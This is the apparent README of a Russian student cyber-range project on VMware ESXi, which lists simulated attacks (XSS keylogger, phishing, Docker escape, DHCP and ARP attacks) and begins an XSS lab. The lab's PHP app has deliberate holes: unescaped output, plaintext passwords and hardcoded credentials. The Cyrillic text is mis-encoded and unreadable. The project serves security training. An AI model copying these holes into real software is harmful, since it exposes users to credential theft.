<h1 align="center">Stand ESXi for Cyber Attacks</h1>
<p align="center">
  <em>–î–∏–ø–ª–æ–º–Ω–∞—è —Ä–∞–±–æ—Ç–∞ (2025) –ø–æ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—é ¬´–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å¬ª</em><br>
  <strong>–ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–π —Å—Ç–µ–Ω–¥ –Ω–∞ –±–∞–∑–µ VMware ESXi –¥–ª—è –º–æ–¥–µ–ª–∏—Ä–æ–≤–∞–Ω–∏—è –∏ –æ—Ç—Ä–∞–±–æ—Ç–∫–∏ –∫–∏–±–µ—Ä–∞—Ç–∞–∫, —Å–µ—Ç–µ–≤—ã—Ö –∞—Ç–∞–∫ —Å –æ–ø–∏—Å–∞–Ω–∏–µ–º –∑–∞—â–∏—Ç–Ω—ã—Ö –º–µ—Ä</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Windows-10-0078D6?logo=windows&logoColor=white" alt="Windows 10">
  <img src="https://img.shields.io/badge/VMware-ESXi-555?logo=vmware&logoColor=white" alt="VMware ESXi">
  <img src="https://img.shields.io/badge/Docker-Engine-2496ED?logo=docker&logoColor=white" alt="Docker">
  <img src="https://img.shields.io/badge/Debian-GNU%2FLinux-A81D33?logo=debian&logoColor=white" alt="Debian">
  <br>
  <img src="https://img.shields.io/badge/Kali-Linux-557C94?logo=kalilinux&logoColor=white" alt="Kali Linux">
  <img src="https://img.shields.io/badge/Ubuntu-Server-E95420?logo=ubuntu&logoColor=white" alt="Ubuntu">
  <img src="https://img.shields.io/badge/PostgreSQL-DB-336791?logo=postgresql&logoColor=white" alt="PostgreSQL">
  <img src="https://img.shields.io/badge/MikroTik-RouterOS-9B9B9B" alt="MikroTik">
</p>

---

## üß≠ –û –ø—Ä–æ–µ–∫—Ç–µ

**Stand ESXi for Cyber Attacks** ‚Äî —ç—Ç–æ —É—á–µ–±–Ω–æ-–ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–π —Å—Ç–µ–Ω–¥ –Ω–∞ –±–∞–∑–µ –≥–∏–ø–µ—Ä–≤–∏–∑–æ—Ä–∞ **VMware ESXi**, –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã–π –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –º–æ–¥–µ–ª–∏—Ä–æ–≤–∞–Ω–∏—è —Ä–µ–∞–ª—å–Ω—ã—Ö –∞—Ç–∞–∫, —Å –æ–ø–∏—Å–∞–Ω–∏–µ–º –∑–∞—â–∏—Ç–Ω—ã—Ö –º–µ—Ä.  
–°—Ç–µ–Ω–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±—É—á–µ–Ω–∏—è, –ø—Ä–æ–≤–µ—Ä–∫–∏ –≥–∏–ø–æ—Ç–µ–∑, –æ—Ç—Ä–∞–±–æ—Ç–∫–∏ —Ä–µ–∞–≥–∏—Ä–æ–≤–∞–Ω–∏—è –∏ –∞–Ω–∞–ª–∏–∑–∞ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–æ–≤ –≤ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–π —Å—Ä–µ–¥–µ.

**–ü–µ—Ä–∏–æ–¥ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏:** –∞–ø—Ä–µ–ª—å ‚Äì –∏—é–Ω—å 2025 –≥–æ–¥–∞.  
**–ö–ª—é—á–µ–≤—ã–µ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è:** Blue Team, Red Team, —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏—è –∏ —á—É—Ç—å-—á—É—Ç—å —Å–µ—Ç–∏ ^^.

---

## üîç Common Weakness Enumeration

–í —Ö–æ–¥–µ —Ä–∞–±–æ—Ç—ã –±—ã–ª–∏ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã –∏ –∏–∑—É—á–µ–Ω—ã —Å–ª–µ–¥—É—é—â–∏–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –∞—Ç–∞–∫:

1. **Keylogger (CWE-79)** ‚Äî –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ JS —á–µ—Ä–µ–∑ XSS –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à.
2. **Phishing (CWE-79)** ‚Äî –ø–æ–¥–º–µ–Ω–∞ —Ñ–æ—Ä–º—ã –ª–æ–≥–∏–Ω–∞ —á–µ—Ä–µ–∑ XSS –∏ –∫—Ä–∞–∂–∞ —É—á—ë—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.
3. **Stealer (CWE-200)** ‚Äî —ç–º—É–ª—è—Ü–∏—è –ø–æ—Ö–∏—â–µ–Ω–∏—è –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –∏ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.
4. **Docker Escape (CVE-2022-0492)** ‚Äî –≤—ã—Ö–æ–¥ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ —Å –¥–æ—Å—Ç—É–ø–æ–º –∫ —Ö–æ—Å—Ç—É.
5. **DHCP Starvation & Rogue DHCP (CWE-346)** ‚Äî –∏—Å—á–µ—Ä–ø–∞–Ω–∏–µ –ø—É–ª–∞ –∞–¥—Ä–µ—Å–æ–≤ –∏ —Ä–∞–∑–¥–∞—á–∞ –ª–æ–∂–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –¥–ª—è MITM.
6. **ARP Spoofing (CWE-345)** ‚Äî –ø–æ–¥–º–µ–Ω–∞ ARP-–∑–∞–ø–∏—Å–µ–π –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Ç—Ä–∞—Ñ–∏–∫–∞.
7. **Brute-force (CWE-307)** ‚Äî –ø–µ—Ä–µ–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π –¥–ª—è –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞.
8. **QRLJacking (CWE-285)** ‚Äî –∑–∞—Ö–≤–∞—Ç —Å–µ—Å—Å–∏–∏ —á–µ—Ä–µ–∑ –ø–æ–¥–º–µ–Ω—É QR-–∫–æ–¥–∞.

---

## üéØ –¶–µ–ª–∏ –ø—Ä–æ–µ–∫—Ç–∞

–†–∞–∑—Ä–∞–±–æ—Ç–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º–Ω—ã–π —Å—Ç–µ–Ω–¥ –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –∫–∏–±–µ—Ä—É—á–µ–Ω–∏–π –ø–æ –∑–∞—â–∏—Ç–µ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –æ—Ç –∫–∏–±–µ—Ä–∞—Ç–∞–∫. –°—Ç–µ–Ω–¥ –ø–æ–∑–≤–æ–ª–∏—Ç –º–æ–¥–µ–ª–∏—Ä–æ–≤–∞—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω—ã–µ —É–≥—Ä–æ–∑—ã –∏ –æ—Ç—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –º–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã, —á—Ç–æ –ø–æ–≤—ã—Å–∏—Ç –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –ø–µ—Ä—Å–æ–Ω–∞–ª–∞ –∫ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–º—É –≤—ã—è–≤–ª–µ–Ω–∏—é –∏ –Ω–µ–π—Ç—Ä–∞–ª–∏–∑–∞—Ü–∏–∏ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —É–≥—Ä–æ–∑.

---

## üèó –°–æ—Å—Ç–∞–≤ –∏ —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç–µ–Ω–¥–∞

**–ê–ø–ø–∞—Ä–∞—Ç–Ω–∞—è –±–∞–∑–∞:** —Å–µ—Ä–≤–µ—Ä Supermicro  
- CPU: 2√ó Intel Xeon Silver 4216 (2.10 GHz)  
- RAM: 256 GB DDR4  
- NIC: 2√ó Intel Ethernet X722  
- SSD: 4 –¢–ë  
- HDD: 2 –¢–ë  
- RAID: MegaRAID SAS + Lewisburg SATA  

**–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:** VMware ESXi (–æ—Å–Ω–æ–≤–Ω–æ–π –≥–∏–ø–µ—Ä–≤–∏–∑–æ—Ä)  
–ù–∞ ESXi —Ä–∞–∑–≤—ë—Ä–Ω—É—Ç –≤–ª–æ–∂–µ–Ω–Ω—ã–π ESXi (20vCPU, 30 GB, 500 GB) –∫–∞–∫ —É—á–µ–±–Ω—ã–π —Å—Ç–µ–Ω–¥. –í –Ω—ë–º —Å–æ–∑–¥–∞–Ω–æ **8 –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω** –∏ **1 –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–π –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä**.

---

### –í–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –º–∞—à–∏–Ω—ã

1. **Debian 12** ‚Äî –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –∏ –°–£–ë–î  
   - Docker, PHP, Nginx/Apache, PostgreSQL, pgAdmin  
   - –¢–µ—Å—Ç–æ–≤–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–µ–π, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–µ–π, –õ–ö  

2. **Windows 10** ‚Äî —Ä–∞–±–æ—á–∞—è —Å—Ç–∞–Ω—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è  
   - –ò–º–∏—Ç–∞—Ü–∏—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –ø–æ —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–º/XSS-—Å—Å—ã–ª–∫–∞–º, QRLJacking  

3. **Kali Linux** ‚Äî —Å–µ—Ç–µ–≤—ã–µ –∞—Ç–∞–∫–∏  
   - ARP spoofing, brute-force  

4. **Kali Linux** ‚Äî –∞—Ç–∞–∫–∏ –Ω–∞ DHCP  
   - DHCP Starvation, Rogue DHCP + MITM  

5. **Debian 12** ‚Äî —É—è–∑–≤–∏–º—ã–π –≤–µ–±-—Å–∞–π—Ç (–º–∏—à–µ–Ω—å)  
   - Docker, –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è —Ç–µ—Å—Ç–æ–≤ –∞—Ç–∞–∫  

6. **Debian 12** ‚Äî —Å–∞–π—Ç –¥–ª—è DHCP-–∞—Ç–∞–∫ (–º–∏—à–µ–Ω—å)  
   - Docker, —Å–µ—Ä–≤–∏—Å—ã –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞  

7. **Debian 12** ‚Äî ¬´–ø–æ—Ä—Ç–∞–ª –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞¬ª  
   - –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ —Å–∫—Ä–∏–ø—Ç—ã, –ø—Ä–∏—ë–º –¥–∞–Ω–Ω—ã—Ö  

8. **Ubuntu** ‚Äî —Ç–µ—Å—Ç QRLJacking –∏ Docker Escape  

9. **MikroTik RouterOS** ‚Äî –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä/—Ü–µ–ª—å –∞—Ç–∞–∫–∏  
   - DHCP-—Å–µ—Ä–≤–µ—Ä, OSPF, –∂–µ—Ä—Ç–≤–∞ DHCP-–∞—Ç–∞–∫  

---

### –ù–∞ –º–æ–º–µ–Ω—Ç –∑–∞—â–∏—Ç—ã, —Å–∏—Å—Ç–µ–º–Ω—ã–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è –Ω–∞ –í–ú –±—ã–ª–∏:

| –í–ú | CPU | RAM | HDD | –ü—Ä–∏–º–µ—á–∞–Ω–∏—è |
|----|-----|-----|-----|------------|
| Debian (web/db) | 2 vCPU | 2 GB | 30 GB | Docker, PostgreSQL |
| Windows 10 | 2 vCPU | 4 GB | 40 GB | GUI, –±—Ä–∞—É–∑–µ—Ä—ã |
| Kali Linux (—Å–µ—Ç–∏) | 2 vCPU | 2 GB | 40 GB | –∞—Ç–∞–∫–∏ L2/L3 |
| Kali Linux (DHCP) | 2 vCPU | 2 GB | 40 GB | MITM DHCP |
| Debian (–º–∏—à–µ–Ω—å) | 2 vCPU | 2 GB | 30 GB | –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ |
| Debian (DHCP –º–∏—à–µ–Ω—å) | 2 vCPU | 2 GB | 30 GB | —Ç–µ—Å—Ç DHCP |
| Debian (–∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫) | 2 vCPU | 2 GB | 30 GB | —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö |
| Ubuntu | 2 vCPU | 2 GB | 30 GB | Docker Escape, QRLJacking |
| MikroTik | 1 vCPU | 1 GB | 8 GB | RouterOS |

---

**–ò—Ç–æ–≥:** —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ä–æ–ª–µ–π –∏ —Ä–µ—Å—É—Ä—Å–æ–≤ –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—å –∞—Ç–∞–∫–∏ –æ—Ç L2-—Å–µ—Ç–µ–π –¥–æ –≤–µ–±-—É—Ä–æ–≤–Ω—è –∏ –ø—Ä–æ–≤–µ—Ä—è—Ç—å –º–Ω–æ–≥–æ—É—Ä–æ–≤–Ω–µ–≤—É—é –∑–∞—â–∏—Ç—É –≤ —É—Å–ª–æ–≤–∏—è—Ö, –ø—Ä–∏–±–ª–∏–∂—ë–Ω–Ω—ã—Ö –∫ —Ä–µ–∞–ª—å–Ω—ã–º.

---

## ‚ö†Ô∏è –î–∏—Å–∫–ª–µ–π–º–µ—Ä

–í—Å–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –≤—ã–ø–æ–ª–Ω—è–ª–∏—Å—å –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ç–µ—Å—Ç–æ–≤–æ–π —Å—Ä–µ–¥–µ –≤ —É—á–µ–±–Ω—ã—Ö —Ü–µ–ª—è—Ö.  
–ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –ø–æ–¥–æ–±–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫ –≤ —Ä–µ–∞–ª—å–Ω–æ–π –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –±–µ–∑ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è —è–≤–ª—è–µ—Ç—Å—è –Ω–∞—Ä—É—à–µ–Ω–∏–µ–º –∑–∞–∫–æ–Ω–∞.

## 1 üñ• –ê—Ç–∞–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞ –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –≤–≤–æ–¥–∞ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã

**–ú–µ–∂—Å–∞–π—Ç–æ–≤—ã–π —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥ (Cross-Site Scripting, XSS)** ‚Äî —ç—Ç–æ –∫–ª–∞—Å—Å —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä—è–µ—Ç –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –∫–ª–∏–µ–Ω—Ç—Å–∫–∏–π –∫–æ–¥ –≤ —Å—Ç—Ä–∞–Ω–∏—Ü—É, –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º—É—é –≤ –±—Ä–∞—É–∑–µ—Ä–µ –∂–µ—Ä—Ç–≤—ã. –¢–∞–∫–æ–π –∫–æ–¥ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –¥–æ–≤–µ—Ä–µ–Ω–Ω–æ–≥–æ –¥–æ–º–µ–Ω–∞ –∏ –ø–æ–ª—É—á–∞–µ—Ç —Ç–µ –∂–µ –ø—Ä–∞–≤–∞, —á—Ç–æ –∏ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π —Å–∫—Ä–∏–ø—Ç —Å–∞–π—Ç–∞: –¥–æ—Å—Ç—É–ø –∫ DOM, cookies —Å–µ—Å—Å–∏–∏, —Ç–æ–∫–µ–Ω–∞–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏, –∞ —Ç–∞–∫–∂–µ –ø–æ–ª—è–º –≤–≤–æ–¥–∞.

–í –¥–∞–Ω–Ω–æ–º —Å—Ü–µ–Ω–∞—Ä–∏–∏ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è —É—è–∑–≤–∏–º–æ—Å—Ç—å **CWE-79**, –ø–æ–∑–≤–æ–ª—è—é—â–∞—è –≤–Ω–µ–¥—Ä–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π JavaScript-–∫–æ–¥, —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É—é—â–∏–π –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –æ—Ç–ø—Ä–∞–≤–ª—è—é—â–∏–π –∏—Ö –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É.

---

### üîπ –õ–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω—ã–π —Å—Ç–µ–Ω–¥

**–¢–∞–±–ª–∏—Ü–∞ 1 ‚Äî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å—Ç–µ–Ω–¥–∞ –¥–ª—è –∞—Ç–∞–∫–∏ keylogger**

| IP-–∞–¥—Ä–µ—Å / –ü–æ—Ä—Ç     | –†–æ–ª—å                | –û–ø–∏—Å–∞–Ω–∏–µ |
|---------------------|--------------------|----------|
| `192.168.0.69:2222` | –í–µ–±-—Å–µ—Ä–≤–µ—Ä          | –°–∞–π—Ç –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏: —Ñ–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç |
| `192.168.0.69:1111` | pgAdmin4            | –í–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏—è PostgreSQL |
| `192.168.0.69:5432` | PostgreSQL          | –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö —Å–∞–π—Ç–∞ |
| `192.168.0.89`      | –ö–ª–∏–µ–Ω—Ç *(Windows 10)*| –ñ–µ—Ä—Ç–≤–∞ –∞—Ç–∞–∫–∏ ‚Äî –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å—Å—ã–ª–∫—É —Å XSS-payload |
| `192.168.0.114:3333`| –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ *(Debian)*| –•–æ—Å—Ç–∏–Ω–≥ `keylogger.php` –∏ –ø—Ä–∏—ë–º –¥–∞–Ω–Ω—ã—Ö (`keylog.txt`) |

---

üí° *–°—Ç–µ–Ω–¥ —Ä–∞–∑–≤—ë—Ä–Ω—É—Ç –≤ –ª–æ–∫–∞–ª—å–Ω–æ–π —Å–µ—Ç–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Docker Compose –∏ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã—Ö –º–∞—à–∏–Ω.*  
–í–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ –Ω–∞ PHP.

---

### üõ† –≠—Ç–∞–ø 1 ‚Äî –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –æ–∫—Ä—É–∂–µ–Ω–∏—è

> –†–∞–∑–≤–æ—Ä–∞—á–∏–≤–∞–µ–º —Å–µ—Ä–≤–µ—Ä–Ω—É—é —á–∞—Å—Ç—å: –≤–µ–±‚Äë–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ PHP + PostgreSQL –≤ Docker. –≠—Ç–æ—Ç —ç—Ç–∞–ø –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —Ä–∞–±–æ—Ç–æ—Å–ø–æ—Å–æ–±–Ω—ã–º —Å–∞–π—Ç–æ–º (–ø–æ—Ä—Ç `2222`) –∏ pgAdmin (–ø–æ—Ä—Ç `1111`). –í –∫–æ–¥–µ –Ω–∞–º–µ—Ä–µ–Ω–Ω–æ –æ—Å—Ç–∞–≤–ª–µ–Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å (—Ç–æ—á–∫–∏ XSS), –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–∞–ª–µ–µ –¥–ª—è keylogger‚Äë—Å—Ü–µ–Ω–∞—Ä–∏—è.

---

## üîß –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –∏ —Ä–æ–ª–∏

* **php (Apache + PHP)** ‚Äî —É—è–∑–≤–∏–º–æ–µ –≤–µ–±‚Äë–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ (–ø–æ—Ä—Ç `2222 ‚Üí 80`).
* **db (PostgreSQL)** ‚Äî –ë–î –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è (–ø–æ—Ä—Ç `5432`).
* **pgadmin (pgAdmin4)** ‚Äî GUI –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏—è –ë–î (–ø–æ—Ä—Ç `1111 ‚Üí 80`).

**–°–µ–≥–º–µ–Ω—Ç —Å–µ—Ç–∏**: DMZ (–≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ —Å–≤—è–∑–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤ ‚Äî —á–µ—Ä–µ–∑ Docker‚Äë—Å–µ—Ç—å).
**–ì–¥–µ —É—è–∑–≤–∏–º–æ—Å—Ç—å:** –Ω–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–π –≤—ã–≤–æ–¥ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `payload` –≤ `login.php` –∏ `dashboard.php` (–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ).

---

## üì¶ C–µ—Ä–≤–µ—Ä–Ω–∞—è —á–∞—Å—Ç—å

```yaml
version: '3.8'

services:
  db:
    image: postgres:latest
    container_name: postgres_db
    environment:
      POSTGRES_USER: 163justIneffable
      POSTGRES_PASSWORD: P@ssw0rd
      POSTGRES_DB: anubis
    volumes:
      - db_data:/var/lib/postgresql/data
    ports:
      - "5432:5432"

  pgadmin:
    image: dpage/pgadmin4:latest
    container_name: pgadmin
    environment:
      PGADMIN_DEFAULT_EMAIL: *mail*
      PGADMIN_DEFAULT_PASSWORD: P@ssw0rd!
    ports:
      - "1111:80"
    depends_on:
      - db

  php:
    build:
      context: .
      dockerfile: Dockerfile
    volumes:
      - ./html:/var/www/html
    ports:
      - "2222:80"
    depends_on:
      - db

volumes:
  db_data:
```

### Dockerfile

```dockerfile
FROM php:apache

RUN apt-get update && \
    apt-get install -y libpq-dev && \
    docker-php-ext-install pgsql pdo_pgsql
```

> *–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:* –±–∞–∑–æ–≤—ã–π –æ–±—Ä–∞–∑ `php:apache` —É–∂–µ —Å–æ–¥–µ—Ä–∂–∏—Ç Apache —Å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–µ–π –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞ `/var/www/html`.

---

## üóÇ –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø—Ä–æ–µ–∫—Ç–∞

```
project-root/
‚îú‚îÄ docker-compose.yml
‚îú‚îÄ Dockerfile
‚îî‚îÄ html/
   ‚îú‚îÄ index.php
   ‚îú‚îÄ register.php
   ‚îú‚îÄ login.php
   ‚îú‚îÄ dashboard.php
   ‚îú‚îÄ logout.php
   ‚îî‚îÄ db.php
```

–°–æ–∑–¥–∞—ë–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –ø–æ–¥ –∫–æ–¥:

```bash
mkdir -p html
```

---

## üíæ PHP‚Äë–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ (—É—è–∑–≤–∏–º—ã–µ —Ç–æ—á–∫–∏ –æ—Ç–º–µ—á–µ–Ω—ã)

### `html/db.php`

```php
<?php
// db.php ‚Äî –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ PostgreSQL —á–µ—Ä–µ–∑ PDO
$host = 'db';         // –∏–º—è —Å–µ—Ä–≤–∏—Å–∞ –ë–î –∏–∑ docker-compose
$port = '5432';
$db   = 'anubis';
$user = '163justIneffable';
$pass = 'P@ssw0rd';

$dsn = "pgsql:host=$host;port=$port;dbname=$db;";

try {
    $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
} catch (PDOException $e) {
    echo "–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î: " . $e->getMessage();
    exit();
}
```

### `html/index.php`

```php
<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞</title>
</head>
<body>
    <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –Ω–∞ —Å–∞–π—Ç</h1>
    <p>
      <a href="register.php">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</a> |
      <a href="login.php">–í—Ö–æ–¥</a>
    </p>
    <?php
      if(isset($_SESSION['username'])) {
          echo "<p>–ü—Ä–∏–≤–µ—Ç, " . $_SESSION['username'] . "!</p>";
          echo '<p><a href="dashboard.php">–ü–µ—Ä–µ–π—Ç–∏ –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç</a></p>';
      }
    ?>
</body>
</html>
```

### `html/register.php`

```php
<?php
session_start();
require 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $bio = $_POST['bio'];

    // ‚ö†Ô∏è –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω–æ: –±–µ–∑ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è (—É—è–∑–≤–∏–º–æ –ø–æ CWE-79)
    $sql = "INSERT INTO users (username, password, bio) VALUES (:username, :password, :bio)";
    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(':username', $username);
    $stmt->bindValue(':password', $password);
    $stmt->bindValue(':bio', $bio);

    try {
        $stmt->execute();
        $_SESSION['username'] = $username;
        header("Location: dashboard.php");
        exit();
    } catch (PDOException $e) {
        echo "–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: " . $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</title>
</head>
<body>
    <h1>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h1>
